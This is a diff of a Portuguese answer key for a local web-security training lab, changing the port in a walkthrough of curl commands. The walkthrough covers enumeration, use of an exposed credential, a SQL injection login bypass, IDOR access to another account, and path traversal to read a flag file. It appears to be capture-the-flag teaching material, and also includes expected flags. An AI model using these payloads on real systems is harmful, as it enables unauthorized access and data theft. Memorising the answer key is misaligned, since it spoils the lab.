@@ -5,7 +5,7 @@ Gabarito tecnico objetivo do lab **web-basic-01**.
 Escopo autorizado:
 
 ```text
-http://localhost:8080
+http://localhost:8088
 ```
 
 ## 1. Enumeracao
@@ -13,13 +13,13 @@ http://localhost:8080
 Validar home:
 
 ```bash
-curl -i http://localhost:8080
+curl -i http://localhost:8088
 ```
 
 Procurar comentario HTML:
 
 ```bash
-curl -s http://localhost:8080 | grep -i "<!--"
+curl -s http://localhost:8088 | grep -i "<!--"
 ```
 
 Comentario esperado:
@@ -31,7 +31,7 @@ Comentario esperado:
 Ler `robots.txt`:
 
 ```bash
-curl -i http://localhost:8080/robots.txt
+curl -i http://localhost:8088/robots.txt
 ```
 
 Rotas descobertas:
@@ -45,7 +45,7 @@ Rotas descobertas:
 Status verboso:
 
 ```bash
-curl -i http://localhost:8080/status
+curl -i http://localhost:8088/status
 ```
 
 ## 2. Credencial exposta
@@ -59,7 +59,7 @@ GET /dev.txt
 Acao:
 
 ```bash
-curl -i http://localhost:8080/dev.txt
+curl -i http://localhost:8088/dev.txt
 ```
 
 Credencial:
@@ -77,7 +77,7 @@ FLAG{credencial_exposta_capturada}
 Validar uso da credencial:
 
 ```bash
-curl -i -u backup_user:backup123 http://localhost:8080/backup
+curl -i -u backup_user:backup123 http://localhost:8088/backup
 ```
 
 ## 3. SQL Injection no login
@@ -103,13 +103,13 @@ Com `curl`:
 curl -i -c admin.cookies \
   --data-urlencode "username=admin' OR '1'='1' -- " \
   --data-urlencode "password=qualquercoisa" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 Capturar flag:
 
 ```bash
-curl -s -b admin.cookies http://localhost:8080/dashboard | grep -i "FLAG"
+curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
 ```
 
 Flag:
@@ -125,13 +125,13 @@ Login como Joao:
 ```bash
 curl -i -c joao.cookies \
   -d "username=joao&password=joao123" \
-  http://localhost:8080/login
+  http://localhost:8088/login
 ```
 
 Conta de outro usuario:
 
 ```bash
-curl -s -b joao.cookies http://localhost:8080/account/2
+curl -s -b joao.cookies http://localhost:8088/account/2
 ```
 
 Flag:
@@ -145,13 +145,13 @@ FLAG{idor_capturada}
 Arquivo normal:
 
 ```bash
-curl -i "http://localhost:8080/download?file=public-info.txt"
+curl -i "http://localhost:8088/download?file=public-info.txt"
 ```
 
 Traversal correto:
 
 ```bash
-curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 ```
 
 Flag:
